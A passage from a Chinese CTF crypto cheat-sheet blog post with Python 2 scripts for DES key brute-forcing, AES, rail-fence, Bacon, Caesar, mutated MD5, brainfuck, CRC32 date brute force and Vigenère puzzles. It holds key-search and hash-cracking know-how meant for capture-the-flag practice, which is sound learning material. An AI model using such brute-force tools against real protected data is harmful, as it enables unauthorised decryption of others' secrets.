multiprocessing</div><div class="line"></div><div class="line">class maskdes:</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    DES加密算法</div><div class="line">    des(key,[mode],[IV],[pad],[padmode])</div><div class="line">    @key:密钥(8位长度)</div><div class="line">    @mode：模式，支持CBC与ECB</div><div class="line">    @IV：</div><div class="line">    @pad：</div><div class="line">    @padmode：</div><div class="line">    @data：明文</div><div class="line">    @data_en：密文</div><div class="line">    '<span class="string">''</span></div><div class="line">    def __init__(self):</div><div class="line">        pass</div><div class="line"></div><div class="line">    def maskencrypt(self,data,key):</div><div class="line">        <span class="string">''</span><span class="string">'</span></div><div class="line">        明文加密</div><div class="line">        @data:明文</div><div class="line">        @key:密钥</div><div class="line">        '<span class="string">''</span></div><div class="line">        k = des(key,CBC,<span class="string">"\0\0\0\0\0\0\0\0"</span>,pad=None,padmode=PAD_PKCS5) <span class="comment">#des对象</span></div><div class="line">        data_en = k.encrypt(data)       <span class="comment">#进行des加密，返回密文</span></div><div class="line">        </div><div class="line">        <span class="comment"># print u"密文: %r" % data_en</span></div><div class="line"></div><div class="line">        <span class="built_in">return</span> data_en</div><div class="line"></div><div class="line">    def maskdecrypt(self,data,key):</div><div class="line">        <span class="string">''</span><span class="string">'</span></div><div class="line">        密文解密</div><div class="line">        @data:密文</div><div class="line">        @key:密钥</div><div class="line">        '<span class="string">''</span></div><div class="line">        k = des(key,CBC,<span class="string">"\0\0\0\0\0\0\0\0"</span>,pad=None,padmode=PAD_PKCS5) <span class="comment">#des对象</span></div><div class="line">        data_de = k.decrypt(data)   <span class="comment">#进行des解密，返回明文</span></div><div class="line"></div><div class="line">        <span class="comment"># print u"明文: %r" % data_de</span></div><div class="line"></div><div class="line">        <span class="built_in">return</span> data_de</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">def des_run(key,cur,data_en):</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    破解des密码函数</div><div class="line">    '<span class="string">''</span></div><div class="line">    <span class="comment">#print key</span></div><div class="line">    </div><div class="line">    data_de=cur.maskdecrypt(data_en,str(key))</div><div class="line">    <span class="keyword">if</span> data_de==<span class="string">"Hello World"</span>:</div><div class="line">        <span class="built_in">print</span> data_de</div><div class="line">        <span class="built_in">return</span> True</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">return</span> False</div><div class="line">        </div><div class="line">        </div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    已知一个明文，以及密钥，求密文？</div><div class="line">    '<span class="string">''</span></div><div class="line">    key=<span class="string">"10036934"</span></div><div class="line">    data = <span class="string">"Hello World"</span> <span class="comment">#明文</span></div><div class="line"></div><div class="line">    cur=maskdes()</div><div class="line">    data_en=cur.maskencrypt(data,key)</div><div class="line">    <span class="built_in">print</span> u<span class="string">"密文: %r"</span> % data_en</div><div class="line">    with open(<span class="string">"result.txt"</span>,<span class="string">"w"</span>) as w:</div><div class="line">        w.write(data_en)</div><div class="line"></div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    已知一个密文文件，已知长度为8位的密钥(纯数字)，求明文？</div><div class="line">    解密时，直接将文本中的内容读取复制给一个变量，进行解密即可</div><div class="line">    '<span class="string">''</span></div><div class="line">    <span class="comment">#-------------------------多进程---------------------------</span></div><div class="line">    cur=maskdes()</div><div class="line">    data_en=open(<span class="string">"result.txt"</span>,<span class="string">"r"</span>).<span class="built_in">read</span>()  <span class="comment">##从文件中读取密文</span></div><div class="line">    </div><div class="line">    start=time.time()</div><div class="line">    result=Queue.Queue()</div><div class="line">    pool = Pool()</div><div class="line"></div><div class="line">    def pool_th():</div><div class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> xrange(10000000,11111111): <span class="comment">##密钥范围</span></div><div class="line">            try:</div><div class="line">                result.put(pool.apply_async(des_run,args=(key,cur,data_en)))   <span class="comment">#维持执行的进程总数为10，当一个进程执行完后添加新进程.</span></div><div class="line">            except:</div><div class="line">                <span class="built_in">break</span></div><div class="line"></div><div class="line">    def result_th():</div><div class="line">        <span class="keyword">while</span> 1:</div><div class="line">            a=result.get().get()</div><div class="line">            <span class="keyword">if</span> a:</div><div class="line">                pool.terminate()</div><div class="line">                <span class="built_in">break</span></div><div class="line"></div><div class="line">    t1=threading.Thread(target=pool_th)</div><div class="line">    t2=threading.Thread(target=result_th)</div><div class="line">    t1.start()</div><div class="line">    t2.start()</div><div class="line">    t1.join()</div><div class="line">    t2.join()</div><div class="line"></div><div class="line">    <span class="built_in">print</span> <span class="string">"add Process end"</span></div><div class="line">    pool.join()</div><div class="line">    end=time.time()</div><div class="line">    <span class="built_in">print</span> <span class="string">'time is '</span>,end-start</div></pre></td></tr></table></figure></p>
<h3 id="AES解密"><a href="#AES解密" class="headerlink" title="AES解密"></a>AES解密</h3><p>Aes解密脚本源码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- encoding:utf-8 -*-</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">AES算法，密钥（key）长度一般为16,24,32位，密文一般为128位，192位，256位。</div><div class="line">'<span class="string">''</span></div><div class="line">from Crypto.Cipher import AES</div><div class="line">from Crypto import Random</div><div class="line"></div><div class="line">def encrypt(data, password):</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    AES加密算法</div><div class="line">    '<span class="string">''</span></div><div class="line">    bs = AES.block_size</div><div class="line">    pad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)</div><div class="line">    iv = Random.new().<span class="built_in">read</span>(bs)</div><div class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</div><div class="line">    data = cipher.encrypt(pad(data))</div><div class="line">    data = iv + data</div><div class="line">    <span class="built_in">return</span> data</div><div class="line"></div><div class="line">def decrypt(data, password):</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    DES解密算法</div><div class="line">    '<span class="string">''</span></div><div class="line">    bs = AES.block_size</div><div class="line">    <span class="keyword">if</span> len(data) &lt;= bs:</div><div class="line">        <span class="built_in">return</span> data</div><div class="line">    unpad = lambda s : s[0:-ord(s[-1])]</div><div class="line">    iv = data[:bs]</div><div class="line">    cipher = AES.new(password, AES.MODE_CBC, iv)</div><div class="line">    data  = unpad(cipher.decrypt(data[bs:]))</div><div class="line">    <span class="built_in">return</span> data </div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    data = <span class="string">'flagadadh121lsf9adad'</span> <span class="comment">#要加密的数据</span></div><div class="line">    password = <span class="string">'123456789abcdefg'</span> <span class="comment">#16,24,32位长的密码</span></div><div class="line">    encrypt_data = encrypt(data, password)  <span class="comment">##获取加密后的字符串</span></div><div class="line">    <span class="built_in">print</span> <span class="string">'encrypt_data:'</span>, encrypt_data  <span class="comment">#&lt;str&gt;</span></div><div class="line">    </div><div class="line">    decrypt_data = decrypt(encrypt_data, password)</div><div class="line">    <span class="built_in">print</span> <span class="string">'decrypt_data:'</span>, decrypt_data  <span class="comment">#&lt;str&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="RSA解密"><a href="#RSA解密" class="headerlink" title="RSA解密"></a>RSA解密</h3><p>关于RSA相关内容，我之前有总结过，可移步：<a href="http://thief.one/2016/09/06/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%A7%A3%E6%9E%90/">RSA加密算法解析</a></p>
<h3 id="栅栏加密"><a href="#栅栏加密" class="headerlink" title="栅栏加密"></a>栅栏加密</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">***栅栏加密方法***</div><div class="line">加密方法自行百度，解密方法如下：</div><div class="line">例子：adaufdns p</div><div class="line">先计算密文的长度，如长度为10(空格也算)，因为每行的字符串数量一样，因此这里要么是分为5行，要么就是2行。</div><div class="line">假设是分为2行，则每5个为一行分开：</div><div class="line">adauf（前5）</div><div class="line">dns p（后5）</div><div class="line">再将每行首字符合并：</div><div class="line">答案：addnasu fp</div><div class="line">多行的话也是一样</div><div class="line">@By nmask   2016.12.6</div><div class="line">'<span class="string">''</span></div><div class="line">string=<span class="string">"tn c0afsiwal kes,hwit1r  g,npt  ttessfu&#125;ua u  hmqik e &#123;m,  n huiouosarwCniibecesnren."</span></div><div class="line">string=list(string)</div><div class="line"><span class="built_in">print</span> <span class="string">'String len is :'</span>,len(string)    <span class="comment">##字符串总长度</span></div><div class="line">result=[]</div><div class="line">answer=<span class="string">""</span></div><div class="line">i=17 <span class="comment">##因为长度为85，因此这里写17或者5</span></div><div class="line">def split_list(st):</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    将密文字符串分隔成多行，每行的数量一样。</div><div class="line">    '<span class="string">''</span></div><div class="line">    st1=st[0:i]</div><div class="line">    result.append(st1)</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(st)/i-1):</div><div class="line">        sts=st[i*(j+1):i*(j+2)]</div><div class="line">        result.append(sts)</div><div class="line">    <span class="built_in">return</span> result</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    result=split_list(string)</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    将每行的首字符相组合</div><div class="line">    '<span class="string">''</span></div><div class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> range(i):</div><div class="line">        sums=<span class="string">""</span></div><div class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> result:</div><div class="line">            sums=sums+n[m]</div><div class="line">        answer+=sums</div><div class="line">    <span class="built_in">print</span> answer</div></pre></td></tr></table></figure>
<h3 id="培根加密算法"><a href="#培根加密算法" class="headerlink" title="培根加密算法"></a>培根加密算法</h3><p>培根算法对照表如下：<br>A aaaaa<br>B aaaab<br>C aaaba<br>D aaabb<br>E aabaa<br>F aabab<br>G aabba<br>H aabbb<br>I abaaa<br>J abaab<br>K ababa<br>L ababb<br>M abbaa<br>N abbab<br>O abbba<br>P abbbb<br>Q baaaa<br>R baaab<br>S baaba<br>T baabb<br>U babaa<br>V babab<br>W babba<br>X babbb<br>Y bbaaa<br>Z bbaab</p>
<p>解密源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">@培根加密算法</div><div class="line">'<span class="string">''</span></div><div class="line">string=<span class="string">"ABAAAABABBABAAAABABAAABAAAAAABAAAAAAAABAABBBAABBAB"</span></div><div class="line">dicts=&#123;<span class="string">'aabbb'</span>: <span class="string">'H'</span>, <span class="string">'aabba'</span>: <span class="string">'G'</span>, <span class="string">'baaab'</span>: <span class="string">'R'</span>, <span class="string">'baaaa'</span>: <span class="string">'Q'</span>, <span class="string">'bbaab'</span>: <span class="string">'Z'</span>, <span class="string">'bbaaa'</span>: <span class="string">'Y'</span>, <span class="string">'abbab'</span>: <span class="string">'N'</span>, <span class="string">'abbaa'</span>: <span class="string">'M'</span>, <span class="string">'babaa'</span>: <span class="string">'U'</span>, <span class="string">'babab'</span>: <span class="string">'V'</span>, <span class="string">'abaaa'</span>: <span class="string">'I'</span>, <span class="string">'abaab'</span>: <span class="string">'J'</span>, <span class="string">'aabab'</span>: <span class="string">'F'</span>, <span class="string">'aabaa'</span>: <span class="string">'E'</span>, <span class="string">'aaaaa'</span>: <span class="string">'A'</span>, <span class="string">'aaaab'</span>: <span class="string">'B'</span>, <span class="string">'baabb'</span>: <span class="string">'T'</span>, <span class="string">'baaba'</span>: <span class="string">'S'</span>, <span class="string">'aaaba'</span>: <span class="string">'C'</span>, <span class="string">'aaabb'</span>: <span class="string">'D'</span>, <span class="string">'abbbb'</span>: <span class="string">'P'</span>, <span class="string">'abbba'</span>: <span class="string">'O'</span>, <span class="string">'ababa'</span>: <span class="string">'K'</span>, <span class="string">'ababb'</span>: <span class="string">'L'</span>, <span class="string">'babba'</span>: <span class="string">'W'</span>, <span class="string">'babbb'</span>: <span class="string">'X'</span>&#125;</div><div class="line">sums=len(string)</div><div class="line">j=5   <span class="comment">##每5个为一组</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(sums/j):</div><div class="line">    result=string[j*i:j*(i+1)].lower()</div><div class="line">    <span class="built_in">print</span> dicts[result],</div></pre></td></tr></table></figure></p>
<h3 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h3><p>得知是凯撒加密以后，可以用127次轮转爆破的方式解密<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">@凯撒加密</div><div class="line">'<span class="string">''</span></div><div class="line">lstr=<span class="string">''</span><span class="string">'U8Y]:8KdJHTXRI&gt;XU#?!K_ecJH]kJG*bRH7YJH7YSH]*=93dVZ3^S8*$:8"&amp;:9U]RH;g=8Y!U92'</span>=j*<span class="variable">$KH</span>]ZSj&amp;[S<span class="comment">#!gU#*dK9\.'''</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(127):  </div><div class="line">    str1 = <span class="string">''</span>  </div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lstr:  </div><div class="line">        temp = chr((ord(i)+p)%127)  </div><div class="line">        <span class="keyword">if</span> 32&lt;ord(temp)&lt;127 :  </div><div class="line">            str1 = str1 + temp   </div><div class="line">            feel = 1  </div><div class="line">        <span class="keyword">else</span>:  </div><div class="line">            feel = 0  </div><div class="line">            <span class="built_in">break</span>  </div><div class="line">    <span class="keyword">if</span> feel == 1:</div><div class="line">        <span class="built_in">print</span> str1</div></pre></td></tr></table></figure></p>
<h3 id="变异md5加密"><a href="#变异md5加密" class="headerlink" title="变异md5加密"></a>变异md5加密</h3><p>33位md5解密代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">CMD5加密</div><div class="line">@By nMask 2016.12.6</div><div class="line">一般md5的密文为16或者32位长度的字符串。</div><div class="line">本脚本为，从33位加密的密文中，遍历删除一位长度，然后用md5解密。</div><div class="line">@解密网站：http://www.cmd5.com/b.aspx</div><div class="line">'<span class="string">''</span></div><div class="line">string=<span class="string">"cca9cc444e64c8116a30la00559c042b4"</span></div><div class="line">string=list(string)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    遍历删除一位，然后将字符串放入cmd5网站，批量解密。</div><div class="line">    '<span class="string">''</span></div><div class="line">    result=string[:] <span class="comment">##复制一个列表，不会改变原列表。</span></div><div class="line">    result.pop(i)</div><div class="line">    </div><div class="line">    <span class="built_in">print</span> <span class="string">""</span>.join(result)</div></pre></td></tr></table></figure></p>
<h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p>brainfuck语言是比较难编写的一门语言，只有8个字符标识，需要写解释器，解释出用该语言编写的内容<br>其标识符含义如下：</p>
<ul>
<li><em>&gt;</em>指针加一</li>
<li>&lt;指针减一</li>
<li>+指针指向的字节的值加一</li>
<li>-指针指向的字节的值减一</li>
<li>.输出指针指向的单元内容（ASCⅡ码）</li>
<li>,输入内容到指针指向的单元（ASCⅡ码）</li>
<li>[如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处</li>
<li>]如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处</li>
</ul>
<p>解释器代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line">import os</div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">brainfuck语言解释器</div><div class="line">用法：将brainfuck内容存入文本中，保存为.bf格式，然后运行run函数</div><div class="line">'<span class="string">''</span></div><div class="line">def mainloop(program, bracket_map):  </div><div class="line">    pc = 0  </div><div class="line">    tape = Tape()  </div><div class="line">    <span class="keyword">while</span> pc &lt; len(program):  </div><div class="line">        code = program[pc]  </div><div class="line">        <span class="keyword">if</span> code == <span class="string">"&gt;"</span>:  </div><div class="line">            tape.advance()  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"&lt;"</span>:  </div><div class="line">            tape.devance()  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"+"</span>:  </div><div class="line">            tape.inc()  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"-"</span>:  </div><div class="line">            tape.dec()  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"."</span>:  </div><div class="line">            os.write(1, chr(tape.get()))  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">","</span>:   </div><div class="line">            tape.set(ord(os.read(0, 1)[0]))  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"["</span> and tape.get() == 0:   </div><div class="line">            pc = bracket_map[pc]  </div><div class="line">        <span class="keyword">elif</span> code == <span class="string">"]"</span> and tape.get() != 0:  </div><div class="line">            pc = bracket_map[pc]  </div><div class="line">        pc += 1</div><div class="line"></div><div class="line">class Tape(object):  </div><div class="line">    def __init__(self):  </div><div class="line">        self.thetape = [0]  </div><div class="line">        self.position = 0  </div><div class="line">    def get(self):  </div><div class="line">        <span class="built_in">return</span> self.thetape[self.position]  </div><div class="line">    def <span class="built_in">set</span>(self, val):  </div><div class="line">        self.thetape[self.position] = val  </div><div class="line">    def inc(self):  </div><div class="line">        self.thetape[self.position] += 1  </div><div class="line">    def dec(self):  </div><div class="line">        self.thetape[self.position] -= 1  </div><div class="line">    def advance(self):  </div><div class="line">        self.position += 1  </div><div class="line">        <span class="keyword">if</span> len(self.thetape) &lt;= self.position:  </div><div class="line">            self.thetape.append(0)  </div><div class="line">    def devance(self):  </div><div class="line">        self.position -= 1</div><div class="line"></div><div class="line">def parse(program):  </div><div class="line">    parsed = []  </div><div class="line">    bracket_map = &#123;&#125;  </div><div class="line">    leftstack = []  </div><div class="line">    pc = 0  </div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> program:  </div><div class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> (<span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">','</span>, <span class="string">'.'</span>):  </div><div class="line">            parsed.append(char)  </div><div class="line">            <span class="keyword">if</span> char == <span class="string">'['</span>:  </div><div class="line">                leftstack.append(pc)  </div><div class="line">            <span class="keyword">elif</span> char == <span class="string">']'</span>:  </div><div class="line">                left = leftstack.pop()  </div><div class="line">                right = pc  </div><div class="line">                bracket_map[left] = right  </div><div class="line">                bracket_map[right] = left  </div><div class="line">            pc += 1  </div><div class="line"></div><div class="line">    <span class="built_in">return</span> <span class="string">""</span>.join(parsed), bracket_map</div><div class="line"></div><div class="line">def run(fp):  </div><div class="line">    program_contents = <span class="string">""</span>  </div><div class="line">    <span class="keyword">while</span> True:  </div><div class="line">        <span class="built_in">read</span> = os.read(fp, 4096)  </div><div class="line">        <span class="keyword">if</span> len(<span class="built_in">read</span>) == 0:  </div><div class="line">            <span class="built_in">break</span>  </div><div class="line">        program_contents += <span class="built_in">read</span>  </div><div class="line">    os.close(fp)  </div><div class="line">    program, bm = parse(program_contents)  </div><div class="line">    mainloop(program, bm)  </div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    <span class="string">''</span><span class="string">'</span></div><div class="line">    传入.bf文件</div><div class="line">    '<span class="string">''</span></div><div class="line">    run(os.open(<span class="string">"./1.bf"</span>, os.O_RDONLY, 0777))</div></pre></td></tr></table></figure></p>
<h3 id="CRC32"><a href="#CRC32" class="headerlink" title="CRC32"></a>CRC32</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line">@crc32算法</div><div class="line">crc算法的结果可以转化为16进制。</div><div class="line">'<span class="string">''</span></div><div class="line">import binascii</div><div class="line">import datetime</div><div class="line"></div><div class="line">def all_date():</div><div class="line">    <span class="comment">#获取所有日期</span></div><div class="line">    result=[]</div><div class="line">    begin=datetime.date(1900,1,1) <span class="comment">#从1900年1月1日开始</span></div><div class="line">    end=datetime.date(3000,12,6) <span class="comment">#到3000年12月6日结束</span></div><div class="line"></div><div class="line">    delta=datetime.timedelta(days=1)</div><div class="line">    d=begin</div><div class="line"></div><div class="line">    <span class="keyword">while</span> d&lt;=end:</div><div class="line">        date=d.strftime(<span class="string">"%Y%m%d"</span>)</div><div class="line">        d+=delta</div><div class="line">        result.append(date)</div><div class="line"></div><div class="line">    <span class="built_in">return</span> result</div><div class="line"></div><div class="line">def _crc32(content): </div><div class="line">  <span class="comment">#crc32解密</span></div><div class="line">  <span class="built_in">return</span> <span class="string">'%x'</span> % (binascii.crc32(content) &amp; 0xffffffff) <span class="comment">#取crc32的八位数据 %x返回16进制</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    result=all_date()</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</div><div class="line">        <span class="comment">#遍历每一个日期，暴力破解出密文结果</span></div><div class="line">        tag=_crc32(i)</div><div class="line">        <span class="keyword">if</span> tag==<span class="string">"4d1fae0b"</span>:  <span class="comment">##16进制密文</span></div><div class="line">            <span class="built_in">print</span> i</div></pre></td></tr></table></figure>
<h3 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h3><ul>
<li>-　　表示往右</li>
<li>.　　表示往左</li>
</ul>
<p>对照图：<br><img src="/upload_image/20170613/1.png" alt=""></p>
<h3 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h3><p>参考图：<br><img src="/upload_image/20170613/2.png" alt=""></p>
<h3 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h3><p>维吉尼亚密码是凯撒密码的升级版。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">key=<span class="string">'abc'</span></div><div class="line"><span class="comment">#密文内容如下</span></div><div class="line">ciphertext=<span class="string">'csirxeerjsqraeehruamjkxhboaoylgvtsshewqpkbbuarnqhucojvyhpkpeflphvqkfytuhrtdgvbnqgkvwlyprbodpzumsghnkurmjcengiyocfobnswgkrfaipwucmusrprjjruwreibqsdpgxhrqjcglgvdajkiemtebolpkrdvzygnzatavgonwwbqsstvegzaekjxaynebtwszesroflakxrhqodnvxjsesrlwwywiggkkadvrmbvwhztgfugvqrqhrcjfnoldinsntzwmgretfrvrudpcpljlpvzdrpwopneolqsrfrboyowzkefvhpnkrdfdoanopbpygraowqvtbroanopwzruhrewhmtgknchjlsftgkrzciligvdsfhijlnnwtciexiihcoegiedhrwhpvfmsprrsevesztgoezvcxaooazneicweqgrtvmqegkaqbqxvytfrfhpkghpdqgrkiieofkrtvmxobvioyoxfcenfhepgoelzdwpkwyphnvlpnvsngkahnepvdhrhaeacgaxhswgkiremrzrtbvinbqehvqglcrnqtdiuxhrfdocwiinlbvedkjepghnhjrxyppbrlznviaevyvnsxvctjroampwwvwdoylgvrrbziyovsshfdoguidpnqrudakdegkwhuhvypaqkieavlephezvqkrwiphidcplacsuoagejdhrfrtmuleewaoevjczoqwhppcpljduoswiidhelnvqpkdbzjotdmeourwolncrsuhdoqsmtveqxpltkgefzeafwlizutkhpzqanghwffdruxerwsluqysrzdcvvwntmzlnriuaeyoovrwvzpsgrmlsgwmnohhnoonttukixqpilrpabgdvpqrrqcsbjmnxljuuhqrjbrdfcmpghzrqgreykseerppvkrgtdipvwsvdtzdcsivxejkafrlwdjcnwoqngrdfwdszryjpaaghpbtmefwksffegphrucsirxeewdfrhxypcnxcfatecrdjrnosertnoeepgwenrbhrdvjmeprmpaevojgarjlxyztuhrlvkqayvwbqemiosgkaepczeohabfzigeajdymgvleelowajareeevawqeiaagpvrrxyprnqixinwcbqrsahseehreayscrdgkaehhwktoadmzvixhrpegurakzgrwdcgckavqpvrpsldetlvpavlezdrsebhijlrftfzgsnjlhzvdqkseprnbcgvoedzcqrhvniqhsepcxtuhxsfwxytntwoozaxhrpktszslwdohaniwgufuwqrzlznhprndquxsbiajrucfyeexnyqpkiadywefpvhigknzkniaezebahvrwiphegmpxunohmsumxstrqsltnxhrdjwzdpjlwnbu